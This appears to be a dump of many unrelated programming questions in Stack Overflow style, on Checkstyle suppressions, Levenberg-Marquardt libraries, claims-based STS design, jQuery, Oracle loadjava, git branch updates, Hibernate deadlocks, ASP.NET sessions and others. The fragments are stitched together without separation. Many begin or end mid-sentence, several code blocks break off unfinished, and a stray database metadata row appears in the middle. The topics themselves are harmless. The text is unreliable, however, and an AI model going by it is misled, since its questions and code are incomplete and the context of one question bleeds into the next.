<li>Tell Foo-Tests to ""Fingerprint all published artifacts"" with no parameters (I was wondering if Hudson treated JUnit reports as artifacts behind the scenes). This caused an error since I hadn't explicitly defined any artifacts to publish.</li>
</ul>

I use Apache ant to make automatic builds via Continuous Integration.</p>

<p>My problems comes from the following situation: I don't want to fill to much files into the project-basedir, so the checkstyle.xml and the suppressions.xml are both in a subdirectory named conf (for configuration for build). Now Ant and Eclipse work differently for finding the suppressions.xml.</p>

<p>Ant use the project-basedir as basedir for finding the suppressions.xml, after I declared an ant-task to find the checkstyle.xml with the base-configuration of checkstyle. This checkstyle.xml now contains the following:</p>

<pre><code>&lt;module name=""SuppressionFilter""&gt;
    &lt;property name=""file"" value=""conf/suppressions.xml""/&gt;
&lt;/module&gt;
</code></pre>

<p>This way the ant-build finds the suppressions.xml, because the basedir of the build is the project-directory.</p>

<p>Now using the <a href=""http://eclipse-cs.sourceforge.net/"" rel=""noreferrer"">checkstyle-plugin</a> for Eclipse brings a problem. It looks for the suppressions.xml starting with the path the checkstyle.xml has (conf). For Eclipse the declaration had to look like this, to work:</p>

<pre><code>&lt;module name=""SuppressionFilter""&gt;
    &lt;property name=""file"" value=""suppressions.xml""/&gt;
&lt;/module&gt;
</code></pre>

<p>EDIT: Even that doesn't work, Eclipse seems to need always an absolute path.</p>

<p>I want to know a way, that both Eclipse and Ant can work with the same checkstyle-configuration. Someone knows a solution to this problem? Absolute paths are no solution, because every developer and the CI-Server have different paths for the project-directory.</p>

The usual way to solve these is the <a href=""http://en.wikipedia.org/wiki/Levenberg-Marquardt_algorithm"" rel=""nofollow noreferrer"">Levenberg-Marquardt</a> algorithm. I have a couple of questions</p>

<ul>
<li><p>Does anybody have experience on the different LM implementations available? There exist slightly different flavors of LM, and I've heard that the exact implementation of the algorithm has a major effect on the its numerical stability. My functions are pretty well-behaved so this will probably not be a problem, but of course I'd like to choose one of the better alternatives. Here are some alternatives I've found:</p>

<ul>
<li><p><a href=""http://www1.fpl.fs.fed.us/optimization.html"" rel=""nofollow noreferrer"">FPL Statistics Group's Nonlinear Optimization Java Package</a>. This includes a Java translation of the classic Fortran MINPACK routines.</p></li>
<li><p><a href=""http://icl.cs.utk.edu/f2j/"" rel=""nofollow noreferrer"">JLAPACK</a>, another Fortran translation.</p></li>
<li><p><a href=""http://optalgtoolkit.sourceforge.net/"" rel=""nofollow noreferrer"">Optimization Algorithm Toolkit</a>.</p></li>
<li><p><a href=""http://scribblethink.org/Computer/Javanumeric/index.html"" rel=""nofollow noreferrer"">Javanumerics</a>.</p></li>
<li><p>Some Python implementation. Pure Python would be fine, since it can be compiled to Java with jythonc.</p></li>
</ul></li>
<li><p>Are there any commonly used heuristics to do the initial guess that LM requires?</p></li>
<li><p>In my application I need to set some constraints on the solution, but luckily they are simple: I just require that the solutions (in order to be physical solutions) are nonnegative. Slightly negative solutions are result of measurement inaccuracies in the data, and should obviously be zero. I was thinking to use ""regular"" LM but iterate so that if some of the unknowns becomes negative, I set it to zero and resolve the rest from that. Real mathematicians will probably laugh at me, but do you think that this could work?</p></li>
</ul>

<p>Thanks for any opinions!</p>

<p><strong>Update</strong>: This is not rocket science, the number of parameters to solve (N) is at most 5 and the data sets are barely big enough to make solving possible, so I believe Java is quite efficient enough to solve this. And I believe that this problem has been solved numerous times by clever applied mathematicians, so I'm just looking for some ready solution rather than cooking my own. E.g. Scipy.optimize.minpack.leastsq would probably be fine if it was pure Python.. </p>

"232842","1","234319","","2008-10-24 08:35:26","","6","9414","<p>After researching on the topic of claims-Based security (or a federated security model). I've been coming across many examples that use <a href=""http://en.wikipedia.org/wiki/Windows_CardSpace"" rel=""nofollow noreferrer"">CardSpace</a> as an example. The main article that I read that gave a really great explanation of the subject was a <a href=""https://connect.microsoft.com/Downloads/DownloadDetails.aspx?SiteID=642&amp;DownloadID=12901"" rel=""nofollow noreferrer"">PDF</a> by Microsoft on a framework called <a href=""https://connect.microsoft.com/Downloads/Downloads.aspx?SiteID=642"" rel=""nofollow noreferrer"">Zermatt</a>. </p>

<p>The claims-based security architecture I'm looking into is the equivalent of implementing an <a href=""http://msdn.microsoft.com/en-us/library/ff650503.aspx"" rel=""nofollow noreferrer"">STS</a> Authentication Broker in combination with an STS Authorization Broker. This way, when I create a new service all I need to do is ensure that the service will only accept claims issued by the Authorization Broker. And as noted in the article, the Authorization Broker would only accept claims issued by the Authentication Broker. </p>

<p>When that's setup, any time a client attempts to use the new service, it must authenticate with the <strong><em>Authentication Broker</em></strong> <strong>(issuing an authenticated claim)</strong> and then get authorized with the
<strong><em>Authorization Broker</em></strong> <strong>(issuing an authorized claim)</strong>.</p>

<p>This is all fine and dandy and the architecture is clear, but I don't see exactly how to implement an STS. As I mentioned, most (if not all) examples around the web are showing how to use CardSpace, but that doesn't exactly work when you have a database backing up your authentication scheme.</p>

<p><strong>Sample Scenario</strong></p>

I am a quick study though..</p>

<p>What I am after is a way to:</p>

<p>1) identify  tags</p>

<p>2) read the img tags </p>

<p>3) wrap the  tag with an <code>&lt;a href&gt;</code> tag with a dynamic link based on the src of the img.</p>

<p>Example:</p>

<pre><code>&lt;img src=""../../img_T/Culture/C_01/c_01_abb_005.jpg"" width=""310"" height=""180"" alt=""image1""&gt;
</code></pre>

<p>should become</p>

<pre><code>&lt;a href=""../../img_L/Culture/C_01/c_01_abb_005.jpg""&gt;&lt;img src=""../../img_T/Culture/C_01/c_01_abb_005.jpg"" width=""310"" height=""180"" alt=""C 01 Abb 005""&gt;&lt;/a&gt;
</code></pre>

<p>I am thinking that reading the src of each image and writing it to a variable, then reading that variable and replacing the /img_T/ with /img_L/ and then writing that to a new variable which can then be simply added to each href.</p>

<p>This is how far I have gotten, but this does not work at all:</p>

<pre><code>/* in the comments 'xxx' represents a different unique image string */
/* This should get the &lt;img src=""../img_T/xxx"" /&gt; string as text and store it. */
var $imgSrc        =    $("".displaywrapper img"").attr(""src"");

/* This part should use the above sourced &lt;img src=""../img_T/xxx"" string and replace ../img_T/ of the src with ../img_L/ and store it in var = imgLink. */
var imgLink        =    $imgSrc.text().replace(""img_T"",""img_L"");

/* This part should then wrap the &lt;img src=""../img_T/xxx"" /&gt; so it becomes &lt;a href=""..img_L/xxx""&gt;&lt;img src=""../img_T/xxx"" /&gt;&lt;/a&gt; */
$("".displaywrapper img"").each(function(){.wrap(""&lt;a href=""imgLink""&gt;&lt;/a&gt;"")});

<p>What I'm actually trying to decide is if the toy language I've just designed could be used as a general-purpose language.  I know I can prove it is if I can write a Turing machine with it.  But I don't want to go through that exercise until I'm fairly certain of success.</p>

Is there a set of features which virtually guarantees completeness?</p>

<p>I think I've gone off on a tangent by saying ""Turing Complete"".   I'm trying to guess with reasonable confidence that a newly invented language with a certain feature set (or alternately, a VM with a certain instruction set) would be able to compute anything worth computing.  I know proving you can build a Turing machine with it is one way, but not the only way.   </p>

The library seems compatible with the same 1.4 version of the jvm that our Oracle 10g server hosts, since it runs fine outside of Oracle, so I feel like I should be able to get this to work.  This library ends up making SOAP-based http requests, and I get class resolution errors when I run in Oracle.</p>

<p>Here's a line that shows the difference:</p>

<pre><code>Class msgfact = Class.forName(""com.sun.xml.messaging.saaj.soap.MessageFactoryImpl"");
</code></pre>

<p>I tried to register these libraries into Oracle with the loadjava utility, and I got what I thought was a successful result:</p>

<pre>
C:\>loadjava -verbose -schema MYUSER -user MYUSER/MYPWD@dbinstance -force saaj-impl.jar
</pre>

<p>It looks like everything gets loaded, and I can see this MessageFactoryImpl class in that list.  But then I try to run this line of code from Oracle SQL (inside another class I wrote and loaded with loadjava), this line throws a ClassNotFoundException (java.lang.ClassNotFoundException: com/sun/xml/messaging/saaj/soap/MessageFactoryImpl).</p>

<p>Then I went back and tried to add the ""-resolve"" switch at the loadjava command line.  It acts like these saaj classes are getting registered, but they aren't resolving properly.  </p>

<p>How can I successfully get these saaj classes into Oracle,  or if for some reason Oracle already has these loaded, how can I convince my own code to successfully use the existing class?</p>

<p>FWIW, I already took the steps to make sure that the appropriate socket permissions were granted and my code can successfully make a generic http request to the target url.  It just has trouble using the library's SOAP stack to make it happen.</p>

<p>EDIT:
Here is a sample of my loadjava result.  This seems to be showing exactly what's failing, but I'm confused as to why these particular classes aren't being resolved when they seem to be handled properly in the pre-resolution steps.  I've eliminated about 80% of the file here, but there are other classes that show the same class resolution issues.</p>

<li><code>head</code> is the stable version  (not to be confused with git <code>HEAD</code>)</li>
<li><code>experimental</code> is experimental code; it's supposed to compile</li>
<li><code>norman</code> is my sandbox; code in it might be broken</li>
</ul>

<p>The ""master"" git repo is on a file server that is backed up.  But I have replicas on a local disk, on a machine at home, and on my laptop.  (I'm prepared to write code any time, any where).</p>

<p><code>git branch -a</code> shows:</p>

<pre><code>  experimental
  head
* norman
  tufts/HEAD
  tufts/experimental
  tufts/head
  tufts/norman
</code></pre>

<p>the Tufts branches are the remote branches on the ""master"" repo.  The local branches are supposed to track; <code>git config -l | grep -w remote</code> says:</p>

<pre><code>remote.tufts.url=linux.cs.tufts.edu:/r/ghc/git/experimental.git
remote.tufts.fetch=+refs/heads/*:refs/remotes/tufts/*
branch.experimental.remote=tufts
branch.head.remote=tufts
branch.norman.remote=tufts

<p>Here's my question: <strong>how do I update all local branches from their remote counterparts simultaneously</strong>, using a single git command?
<code>git-fetch</code> doesn't quite do the trick; it updates what it knows about the contents of each remote branch, but it doesn't merge them into the local.  And apparently <code>git-pull</code> updates only the currently checked out branch.  I want to update all branches at once.  Can it be done?</p>

<p>(I'm not wild about </p>

<pre><code>for i in `git branch | sed 's/^.//'`; do git checkout $i ; git pull; done

<p>partly because it's not obvious to me what happens to modified files in my working directory while all this is going on, and partly because I'd need yet more shell code to save and restore the info about what branch I'm currently on.)</p>

<pre><code>interface Foo&lt;T&gt; {
  T getOne();
  void useOne(T t);
}

<p>The intention is that the type <code>T</code> is abstract: it enforces a type constraint on implementations of <code>Foo</code>, but the client code doesn't care exactly what <code>T</code> is.</p>

<p>This is no problem in the context of a generic method:</p>

<pre><code>public &lt;T&gt; void doStuff(Foo&lt;T&gt; foo) {
  T t = foo.getOne();
  /* do stuff */
  foo.useOne(t);
}

<p>But suppose I want to break up the work of <code>doStuff</code>, saving some state in a class <code>Bar</code>. In this case, I seem to need to add the type parameter of <code>Foo</code> to <code>Bar</code>.</p>

<pre><code>public class Bar&lt;T&gt; {
  private Foo&lt;T&gt; foo;
  private T t;

  /* ... */

  public void startStuff() {
    t = foo.getOne();
  }

  public void finishStuff() {
    foo.useOne(t);
  }

<p>This is kind of weird, since the type parameter <code>T</code> does not appear in the public interface of <code>Bar</code> (i.e., it is not included in any method parameter or return type). Is there a way to ""quantify <code>T</code> away""? I.e., can I arrange for the parameter <code>T</code> to be hidden in the interface of <code>Bar</code>, as in the following?</p>

<pre><code>public class Bar {
  &lt;T&gt; { // foo and t have to use the same T

I am new to EF but not to ASP.NET, and I'd like to take advantage of the Membership features in ASP.NET.  I am thinking about several ways to do this and would like some advice.  I've done only a little research about this idea thus far, maybe it's been answered elsewhere.  So, here goes a cluster of related questions.</p>

<ol>

<li><p>I want to avoid a situation where I use the built-in Membership functions for only user authentication and switch over to EF context when I'm working with user-tagged data.  Seems clumsy to withdraw user info to bind to a column in a GridView by going into a Membership user for every row, but maybe that's what's needed?  Do I need to suck it up and replicate the Membership classes in EF for data retrieval purposes?</p></li>
<li><p>I was thinking of maybe implementing some kind of EF provider for Membership, on the idea that maybe then the provider could sit inside the overall EF data model.  Is this crazy talk?  (I've never written my own provider before)</p></li>

<li><code>scala.collection.jcl</code></li>

<li>Why are <code>List</code> and <code>Seq</code> defined in package <code>scala</code> and not  <code>scala.collection</code> (even though implementations of <code>Seq</code> are in the collection sub-packages)?</li>
<li>What is the standard mechanism for <em>initializing</em> a collection and then <em>freezing</em> it (which in Java is achieved by wrapping in an <code>unmodifiable</code>)?</li>
<li>Why are some collection types (e.g. <code>MultiMap</code>) only defined as mutable? (There is no immutable <code>MultiMap</code>)?</li>
</ol>

<p>I've read Daniel Spiewak's <a href=""http://www.codecommit.com/blog/scala/scala-collections-for-the-easily-bored-part-1"" rel=""noreferrer"">excellent series on scala collections</a> and am still puzzled by how one would actually use them in practice. The following seems slightly unwieldy due to the enforced full package declarations:</p>

<pre><code>class MyScala {
  var mySet: scala.collection.Set[String] = null 

  def init(): Unit = {
     val s = scala.collection.mutable.Set.empty[String]
     s + ""Hello""
     s + ""World""
     mySet = scala.collection.immutable.Set(s : _ *)

  }

<p>The problem I am trying to solve is where I'm trying to do a custom scroll-to functionality on page load by detecting the anchor in the url, but so far have not been able to prevent the automatic scrolling functionality (specifically in Firefox).</p>

<p>Any ideas? I have tried preventDefault() on the $(window).load() handler, which did not seem to work.</p>

<p>Let me reiterate this is for links that are not clicked within the page that scrolls; it is for links that scroll on page load. Think of clicking on a link from another website with an #anchor in the link. What prevents that autoscroll to the id?</p>

<p>Everyone understand I'm not looking for a workaround; I need to know if (and how) it's possible to prevent autoscrolling to #anchors on page load.</p>

<hr>

<h2><strong>NOTE</strong></h2>

<p>This isn't <em>really</em> an answer to the question, just a simple race-condition-style kluge.</p>

<p>Use jQuery's scrollTo plugin to scroll back to the top of the page, then reanimate the scroll using something custom. If the browser/computer is quick enough, there's no ""flash"" on the page.</p>

<p>I feel dirty just suggesting this...</p>

<pre><code>$(document).ready(function(){

    // fix the url#id scrollto ""effect"" (that can't be
    // aborted apparently in FF), by scrolling back
    // to the top of the page.
    $.scrollTo('body',0);

<p>So, I went searching for a way to increase the timeout period. From what I've read, I believe I cannot do this using <code>System.Net.WebClient</code>. I think I need to use <code>System.Net.WebRequest</code> instead, but I cannot get it to work. The code I've been working on is below:</p>

<pre><code>$myHttpWebRequest = [system.net.WebRequest]::Create($url)
$myHttpWebRequest.Timeout = 600000
$myHttpWebResponse = $myHttpWebRequest.GetResponse()
$sr = New-Object System.IO.StreamReader($response.GetResponseStream())
[xml]$xml = [xml]$sr.ReadToEnd()

<p>The URLs I'm trying to access are internal to my company, so I can't post them. But, they do work in IE and the actual URL should be irrelevant.</p>

<pre>
insert(triangle, bspnode)
{
  ....
  else if(triangle spans bspnode)
  {
    (frontpiece, backpiece) = plane_split(triangle, bspnode)

    insert(frontpiece, bspnode.front)
    insert(backpiece, bspnode.back)
  }
  ....
}

<p>The two insert operations above could be executed by two threads, and since they do not modify the same data, cheap synchronization can be used.</p>

<pre>
insert(triangle, bspnode)
{
  ....
  else if(triangle spans bspnode)
  {
    (frontpiece, backpiece) = split(triangle, bspnode)

    }
  }

<p>Is this a sound programming practice, or am I using threads improperly?  I have not been able to find any literature on this technique.

Ideally I would like to be able to traverse through the grid one cell at a time, as well as obtain the immediate neighbours of any of the grid cells.</p>

<p>My first thought was to store a vector of pointers to a Cell's neighbours (4 in total), then create convenience functions for leftNeighbour, rightNeighbour, etc. Connecting up the grid after initialization.</p>

<p>The std::vector is supposed to be a dynamically resizeable array, so this strikes me as rather unnecessary if I'm only going to hard-code the positions of the pointers (0 == left, 1 == right, etc). However, it does allow a nicer way of iterating through the neighbours of a cell. The other thing I have to consider is if the cell is on a border with the edge of the grid (whether to test for this or just implicitly extend the grid by one cell so that this will never happen).</p>

For us, the way that the project/solutions work is not intuitive and leads to configuruation explosion when you are trying to tweak builds with specific compile time flags.</p>

<p>Under Unix, it's pretty easy to set up a makefile that has its default options overridden by user settings (or other configuration setting).  But doing these types of things seems difficult in Visual Studio.</p>

<p>By way of example, we have a project that needs to get build for 3 different platforms.  Each platform might have several configurations (for example debug, release, and several others).  One of my goals on a newly formed project is to have a solution that can have all platform build living together, which makes building and testing code changes easier since you aren't having to open 3 different solutions just to test your code.  But visual studio will require 3 * (number of base configurations) configurations.  i.e. PC Debug, X360 Debug, PS3 Debug, etc.</p>

<p>It seems like a makefile solution is much better here.  Wrapped with some basic batchfiles or scripts, it would be easy to keep the configuration explotion to a minimum and only maintain a small set of files for all of the different builds that we have to do.</p>

<p>However, I have no experience with makefiles under visual studio and would like to know if others have experiences or issues that they can share.</p>

It has been suggested that the issue is with a process that is performing readonly operations using Hibernate while another process is performing an update on the same row.</p>

<p>The readonly process in question is configured using Hibernate and Spring.  We have not explicitly defined a transaction for the service. While that may not be ideal - I fail to see why Hibernate would try to get an exclusive lock on a row when no save/update operations were performed - only a get/load.</p>

<p>So my question is:  Does Hibernate, when no explicit transaction management is defined, try to get a read/write lock on a row even if only a ""load"" of an object is performed.  No Save/Update is performed.</p>

<p>Is it possible that defining a transaction around the service that is loading data, and then specifically saying READONLY on the transactionAttributes would cause Hibernate to ignore an already existing row lock and just load the data for readonly purposes?</p>

<p>Here are some code examples:</p>

<p>For loading the record we are using a HibernateDaoTemplate</p>

<pre><code>public class HibernatePurchaseOrderDataService extends HibernateDaoSupport implements PurchaseOrderDataService {
    public PurchaseOrderData retrieveById(Long id) {
        return (PurchaseOrderData)getHibernateTemplate().get(PurchaseOrderData.class, id);
    }
}
</code></pre>

<p>The Spring configuration for the service calling this method is:</p>

<pre><code>&lt;bean id=""orderDataService""
      class=""com.example.orderdata.HibernatePurchaseOrderDataService""&gt;
    &lt;property name=""sessionFactory"" ref=""orderDataSessionFactory""/&gt;
&lt;/bean&gt;

&lt;bean id=""orderDataSessionFactory""
      class=""org.springframework.orm.hibernate3.LocalSessionFactoryBean""&gt;
    &lt;property name=""dataSource"" ref=""hibernateDataSource""/&gt;
    &lt;property name=""hibernateProperties"" ref=""hibernateProperties""/&gt;
    &lt;property name=""mappingResources""&gt;
        &lt;list&gt;
            &lt;value&gt;com/example/orderdata/PurchaseOrderData.hbm.xml&lt;/value&gt;
            &lt;value&gt;com/example/orderdata/PurchaseOrderItem.hbm.xml&lt;/value&gt;
        &lt;/list&gt;
    &lt;/property&gt;
&lt;/bean&gt;
</code></pre>

<p>The actual deadlock is occurring on one of the PurchaseOrderItem records being loaded by the call to the load the PurchaseOrder.</p>

<p>Would this cause a deadlock if the record being loaded was locked by another process?  And if so - would adding a transaction wrapper such as the one below solve the problem?</p>

<pre><code>&lt;bean id=""txWrappedOrderDataService""
      class=""org.springframework.transaction.interceptor.TransactionProxyFactoryBean""&gt;
    &lt;property name=""transactionManager"" ref=""transactionManager""/&gt;
    &lt;property name=""target"" ref=""orderDataService""/&gt;
    &lt;property name=""transactionAttributes""&gt;
    &lt;props&gt;
        &lt;!-- all methods require a transaction --&gt;
        &lt;prop key=""*""&gt;PROPAGATION_REQUIRED,readOnly&lt;/prop&gt;
    &lt;/props&gt;
    &lt;/property&gt;
&lt;/bean&gt;
</code></pre>

<p>Update: The DataBase team has seen trace messages on the server that seem to indicate that our ""readonly"" process is actually writing to the database automatically.  There are logged ""UPDATE"" commands that are performed on the exact columns we are reading from the database.  It seems that Hibernate is automatically writing these records back out to the database (even though we aren't asking it to).  That would probably explain why there is a deadlock.</p>

<p>Could this be because of a Session FLUSH or something similar?  Looking more like the solution might be to use a transaction wrapper with readOnly on it...</p>

<p>I have a table that contains a set of images (stored in BLOB) that require processing.  Only one user is supposed to be able to view the same image at the same time.  To achieve this, as each record is retrieved by a user the record is updated with the Session.SessionID.  This update occurs inside a ReaderWriterLock.</p>

<p>I have done a test to ensure the ReaderWriterLock is working correctly and can confirm that only one session can execute the code inside that block at once.</p>

<p>My current theory is that two different users are getting the same SessionID at the same time.  A user of this application is allowed to view records they have locked or any unlocked images.</p>

<p>I have modified the application to display the SessionID in the footer of every page so that if the problem happens again I can check the SessionID value.</p>

<p>I've seen some articles online suggesting that SessionID is not unique and some saying that the SessionID is unique.  I understand that SessionID is not unique forever but can the SessionID value be considered unique for active sessions?</p>

<p><a href=""http://forums.asp.net/p/413704/416543.aspx"" rel=""nofollow noreferrer"">This forum describes a similar problem</a></p>

<p>I have also read some suggestions that a Guid should be stored in the Session object and used as a unique ID instead of the Session ID.</p>

<p>Thanks for the responses so far.  Here is a clarification based on the answers so far:</p>

<p>""Locked forever"" - we prevent this by a lock timeout of 5 minutes.  Before a user locks an image, while inside the ReaderWriterLock, we do a ""cleanup"" of old locks (which unlocks images locked for more than 5 minutes), a query to get the oldest unlocked image and an update statement to ""lock"" that image to the current session.</p>

<p>A possible cause of the problem would be if one user ""locks"" an image but then leaves the PC for a short break.  If they did nothing for 5 minutes, that image on there screen would be unlocked and potentially opened by another user.  I mentioned this scenario when the problem was reported and I was assured that the users had been working continuously.</p>

<p>""Different Window/Tab"" - I haven't actually seen the error with my own eyes but the person who reported the problem has told me that it is two different PC's and two different usernames of the logged in user.</p>

<p>Hopefully now that I am displaying the Session ID on the page, next time it happens I will be able to say with certainty whether it is the same Session ID on two machines or if it is some other problem.  This issue has never occurred during the testing phase so it appears to be a symptom of a larger number of concurrent users.</p>

<p>Thanks for the responses so far and I will update this question as more information comes to hand.</p>

<p>It seems that the user didn't give me the full story.  Session ID is unique in our case as per the accepted answer.  Two users were able to see the same image at the same time because user 1 was idle for the 5 minute ""abandoned image"" unlock process.  The ""abandoned image"" timeout has been raised to match the session timeout to avoid this problem.</p>

<p>Here is an example:</p>

<pre><code>class Test
{
    static void foo(int x) { }

<p>I would have thought that I would be able to pass <code>foo</code> to <code>bar</code> and have the compiler infer the type of <code>Action&lt;T&gt;</code> from the signature of the function being passed but this does not work.  However I can create an <code>Action&lt;int&gt;</code> from <code>foo</code> without casting so is there a legitimate reason that the compiler could not also do the same thing via type inference?</p>

<p>I tried backing up the database on the old server by going to Databases->[Database]->All Tasks->Backup Database..., selecting 'Full', and saving the file. I moved that backup file to the new server and tried to do a restore but it complained saying that it was looking for the [Database].mdf file in the location it was on the old server.</p>

<p>So then I tried to do an Export Data, selected the local SQL 2000 database, pointed it to the new SQL 2005 database on the other machine, and it gets all the way to the end and dies complaining about the way one of the tables is being joined.</p>

<p>I tried then doing a 'Generate SQL' command on the 2000 box and running that under SQL 2005. It looks like there are a lot of outer joins using the old *= syntax that SQL Server 2005 doesn't support anymore and, this being a vendor database, have no idea what their true intentions were when they set up these tables.</p>

<p>Is there any other way I can try migrating this database over?</p>

<li>Customize the form that is displayed for new items, <em>and have it redirect to a thankyou.aspx page</em> rather than showing all the list items? </li>
<li>Set the url to the master page correctly?</li>

<p>It will install OK, but when I hit the site I get an error because ~ is not allowed in the URL. If I use _catalogs/masterpage in the directive, it will not find the master because the URL is relative. Only this code seems to work:</p>

<p>The flow is very simple:</p>

<ul>
<li>If a user enters the app with a URL which doesn't specify all the parameters (or if any of them are invalid) I want to just display the user input controls. (There are only two.)</li>
<li>If a user enters the app with a URL which <em>does</em> have all the required parameters, I want to display the results <em>and</em> the input controls (so they can change the parameters)</li>
</ul>

<p>Here are my self-imposed requirements (mixture of design and implementation):</p>

<ul>
<li>I want the submission to use GET rather than POST, mostly so users can bookmark the page easily.</li>
<li>I <em>don't</em> want the URL to end up looking silly after submission, with extraneous bits and pieces on it. Just the main URL and the real parameters please.</li>
<li>Ideally I'd like to avoid requiring JavaScript at all. There's no good reason for it in this app.</li>
<li>I want to be able to access the controls during render time and set values etc. In particular, I want to be able to set the default values of the controls to the parameter values passed in, if ASP.NET can't do this automatically for me (within the other restrictions).</li>
<li>I'm happy to do all the parameter validation myself, and I don't need much in the way of server side events. It's really simple to set everything on page load instead of attaching events to buttons etc.</li>
</ul>

<p>Most of this is okay, but I haven't found any way of <em>completely</em> removing the viewstate and keeping the rest of the useful functionality. Using the post from <a href=""http://aspnyc.blogspot.com/2007/10/how-to-completely-disable-viewstate.html"" rel=""noreferrer"">this blog post</a> I've managed to avoid getting any actual <em>value</em> for the viewstate - but it still ends up as a parameter on the URL, which looks really ugly.</p>

<p>If I make it a plain HTML form instead of an ASP.NET form (i.e. take out <code>runat=""server""</code>) then I don't get any magic viewstate - but then I can't access the controls programmatically.</p>

<p>I <em>could</em> do all of this by ignoring most of ASP.NET and building up an XML document with LINQ to XML, and implementing <code>IHttpHandler</code>. That feels a bit low level though.</p>

<p>I realise that my problems could be solved by either relaxing my constraints (e.g. using POST and not caring about the surplus parameter) or by using ASP.NET MVC, but are my requirements really unreasonable?</p>

<p>Maybe ASP.NET just doesn't scale <em>down</em> to this sort of app? There's a very likely alternative though: I'm just being stupid, and there's a perfectly simple way of doing it that I just haven't found.</p>

<p>Any thoughts, anyone? (Cue comments of how the mighty are fallen, etc. That's fine - I hope I've never claimed to be an ASP.NET expert, as the truth is quite the opposite...)</p>

<p>Considering the database design below what would be the better option.</p>

<p><img src=""https://i.stack.imgur.com/av4vO.png"" alt=""alt text""></p>

<p><strong>Example 1:</strong> Using auto surrogate keys.</p>

<pre><code>=================   ==================
Road_Number(PK)     Segment_Number(PK)
=================   ==================
 1                   1
</code></pre>

<p><strong>Example 2:</strong> Using program generated PK</p>

<pre><code>=================   ==================
Road_Number(PK)     Segment_Number(PK)
=================   ==================
 ""RD00000001WCK""     ""00000001.1""
</code></pre>

<p>(the <code>00000001.1</code> means it's the <strong>first</strong> segment of the road. This <em>increases</em> everytime you add a new segment e.g. <code>00000001.2</code>)</p>

<p><strong>Example 3:</strong> Using a bit of both(adding a new column)</p>

<pre><code>=======================    ==========================
ID(PK) Road_Number(UK)     ID(PK)  Segment_Number(UK)
=======================    ==========================
 1     ""RD00000001WCK""       1       ""00000001.1""
</code></pre>

<p>Just a bit of background information, we will be using the <code>Road Number</code> and <code>Segment Number</code> in reports and other documents, so they have to be <strong>unique</strong>.   </p>

<p>I have always liked keeping things simple so I <em>prefer</em> example 1, but I have been reading that you should not expose your primary keys in reports/documents. So now I'm thinking more along the lines of example 3.  </p>

<p>I am also leaning towards example 3 because if we decide to change how our asset numbering is generated it won't have to do cascade updates on a primary key.</p>

<p>What do you think we should do?</p>

<ul>
<li>Must preserve string literals in code (as opposed to replacing with macro #define resource ID's), so that the messages are still readable inline</li>
<li>Must allow localized string resources (duh)</li>
<li>Must not impose additional run-time environment restrictions (eg: dependency on .NET, etc.)</li>
<li>Should have minimal obtrusion into existing code (the less modification the better)</li>
<li>Should be debuggable</li>
<li>Should generate resource files which are editable by common tools (ie: common format)</li>
<li>Should not use copy/paste comment blocks to preserve literal strings in code, or anything else which creates the potential for de-synchronization</li>
<li>Would be nice to allow static (compile-time) checking that every ""notated"" string is in the resource file(s)</li>
<li>Would be nice to allow cross-language resource string pooling (for components in various languages, eg: native C++ and .NET)</li>
</ul>

<p>I have a way which fulfills all my wishlist to some extent except for static checking, but I have had to develop a bit of custom code to achieve it (and it has limitations). I'm wondering if anyone has solved this problem in a particularly good way.</p>

<p>Edit:
The solution I currently have looks like this:</p>

<pre><code>ShowMessage( RESTRING( _T(""Some string"") ) );
ShowMessage( RESTRING( _T(""Some string with variable %1""), sNonTranslatedStringVariable ) );

<p>I then have a custom utility to parse out the strings from within the 'RESTRING' blocks and put them into a .resx file for localization, and a separate C# COM object to load them from localized resource files with fallback. If the C# object is not available (or cannot load), I fallback to the string in the code. The macro expands to a template class which calls the COM object and does the formatting, etc.</p>

<p>Anyway, I thought it would be useful to add what I have now for reference.</p>

<p>Besides the Android Marketplace, what are my options as far as deploying an Android application to someone remotely? </p>

<p>The particular issues I am up against are that I have an application which I have written which addresses a somewhat limited problem, for my sister. She is mostly computer literate, but not a developer and lives hours away.</p>

<p>I could see this same issue being common if a company were to want to develop an application for their shiny new G1s and then deploying their application. Surely there is a non-developer-centric way to do this.</p>

The premise is that I can show a smaller image on the screen but if the user needs an enlarged image then I just show them block ui dialog sized to their screen.</p>

<p>The image is dynamically generated so can be sized to whatever dimensions are passed to it from the application.</p>

<p>I've looked and have only found code for centering a div. I'm working on this so if I find an answer I'll post it here (assuming it doesn't replicate anyone elses answers!)</p>

<p>Here's a very simple html snippet for the calling markup:</p>

<pre><code>&lt;div&gt;
   &lt;img src=""someurl"" class=""image"" height=""280px"" width=""452px"" alt="""" /&gt;
&lt;/div&gt;
&lt;div style=""text-align: right;""&gt;
   &lt;a href=""#viewpopup"" id=""viewpopup""&gt;View larger map&lt;/a&gt;
&lt;/div&gt;
</code></pre>

<p>And here's the popup markup</p>

<pre><code>&lt;div id=""popup""&gt;
   &lt;div class=""titlebar""&gt;
      &lt;div class=""title left""&gt;Map details&lt;/div&gt;
      &lt;div class=""closebuttons right""&gt;&lt;a class=""close""&gt;x&lt;/a&gt;&lt;/div&gt;
      &lt;div class=""clearer""&gt;&lt;/div&gt;
   &lt;/div&gt;
   &lt;div class=""popupcontent""&gt;
   &lt;!-- auto append content here --&gt; 
   &lt;/div&gt;
   &lt;div class=""buttonbar""&gt;
      &lt;a class=""close""&gt;Close&lt;/a&gt;
   &lt;/div&gt;
&lt;/div&gt;
</code></pre>

<p>I'm using JQuery, here's the current code I have:</p>

<pre><code>var popup = $(""#popup"");
var popupcontent = popup.children("".popupcontent"");
var image = $("".image"");
$(document).ready(function(){
    $(""#viewpopup"").click(function(){
        // Fudged indent on the top left corner
        var top = 20;
        var left = 20;

        // Dynamically set the contents
        // popupcontent.empty();
        // popupcontent.append();
        $.blockUI({ message: popup, css : { border : 'none', height: 'auto', 'cursor': 'auto', 'width': 'auto', 'top': top, 'left' : left   } });

    });

    $("".close"").live(""click"",function(){
        $.unblockUI();
    });
});
</code></pre>

<p>I've also got to figure out how to set the popupcontent height to auto fill the currently
available space (I'm using ems in my css) but I'm unsure if that's a separate question :).</p>

That part is working spectacularly.  Now I want to use some images in the markup.  (I also would prefer to use linked CSS and JavaScript, however, that can be worked around by just embedding it.)</p>

<p>I have been googling over the course of several days and can't seem to find an answer to the title question.  </p>

